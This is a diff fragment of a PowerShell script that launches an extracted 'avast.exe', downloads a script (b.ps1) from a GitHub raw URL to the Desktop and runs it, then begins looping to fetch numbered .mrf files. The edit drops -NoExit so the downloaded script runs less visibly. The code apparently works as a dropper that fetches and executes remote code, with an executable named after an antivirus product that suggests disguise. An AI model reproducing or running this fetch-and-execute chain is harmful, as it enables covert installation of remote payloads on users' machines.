@@ -27,7 +27,7 @@ Start-Process -FilePath "$extractPath\avast.exe"
 
 Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/user009dm/new/main/b.ps1' -OutFile "$env:USERPROFILE\Desktop\b.ps1"
 $scriptPathss = "$env:USERPROFILE\Desktop\b.ps1"
-Start-Process powershell -ArgumentList "-NoExit -File `"$scriptPathss`""
+Start-Process powershell -ArgumentList "-File `"$scriptPathss`""
 
 for ($i = 1; $i -le 9; $i++) {
     $fileUrl = "https://raw.githubusercontent.com/user009dm/new/main/$i.mrf"
